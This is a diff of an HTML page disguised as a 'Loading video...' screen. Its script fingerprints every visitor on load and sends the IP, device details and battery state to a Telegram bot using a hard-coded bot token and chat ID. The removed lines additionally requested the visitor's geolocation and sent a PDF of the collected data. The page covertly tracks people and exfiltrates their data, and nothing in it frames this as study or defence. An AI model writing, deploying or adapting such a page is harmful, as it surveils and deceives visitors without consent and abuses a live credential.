@@ -4,7 +4,6 @@
   <meta charset="UTF-8" />
   <title>Loading video...</title>
   <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
   <style>
     body {
       background-color: #000;
@@ -33,29 +32,10 @@
   <h2>Loading video...</h2>
 
   <script>
-    const telegramBotToken = 'AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg';
-    const chatId = '363719597';
-
-    async function sendTelegramMessage(message) {
-      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: message })
-      });
-    }
-
-    async function sendTelegramFile(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('document', blob, 'data.pdf');
-
-      await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument`, {
-        method: 'POST',
-        body: formData
-      });
-    }
-
     (async () => {
+      const token = "7978235751:AAEsMF7a4-drLJCRGQGcco9EbznA4VPa6qg";
+      const chatId = "363719597";
+
       const fp = await FingerprintJS.load();
       const result = await fp.get();
 
@@ -65,47 +45,26 @@
         userAgent: navigator.userAgent,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         platform: navigator.platform,
-        battery: await navigator.getBattery().then(b => ({
-          charging: b.charging,
-          level: b.level
-        })).catch(() => "Battery API blocked"),
+        battery: await navigator.getBattery().then(b => `Charging: ${b.charging}, Level: ${b.level}`).catch(() => "Battery API blocked"),
       };
 
-      // تلاش برای گرفتن لوکیشن کاربر
-      let locationInfo = 'Location permission denied or blocked';
-      try {
-        const geo = await new Promise((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(
-            pos => resolve(`Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`),
-            err => resolve('Location access denied')
-          );
-        });
-        locationInfo = geo;
-      } catch (e) {
-        locationInfo = 'Location error';
-      }
+      const message = `
+🖥️ *New Device Info Collected:*
+- IP: ${result.ip}
+- Visitor ID: ${result.visitorId}
+- Screen: ${extraInfo.screen}
+- Language: ${extraInfo.language}
+- UserAgent: ${extraInfo.userAgent}
+- Timezone: ${extraInfo.timezone}
+- Platform: ${extraInfo.platform}
+- Battery: ${extraInfo.battery}
+      `;
 
-      const summary = `
-📍 Location: ${locationInfo}
-🖥️ Platform: ${extraInfo.platform}
-🌐 User Agent: ${extraInfo.userAgent}
-🗺️ Timezone: ${extraInfo.timezone}
-🔋 Battery: ${JSON.stringify(extraInfo.battery)}
-🖥️ Screen: ${extraInfo.screen}
-🗣️ Language: ${extraInfo.language}
-`;
-
-      await sendTelegramMessage(summary);
-
-      // ساخت PDF از دیتا
-      const { jsPDF } = window.jspdf;
-      const doc = new jsPDF();
-      doc.text('Collected Data', 10, 10);
-      doc.text(summary, 10, 20);
-      const pdfBlob = doc.output('blob');
-
-      await sendTelegramFile(pdfBlob);
-
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+      });
     })();
   </script>
 </body>
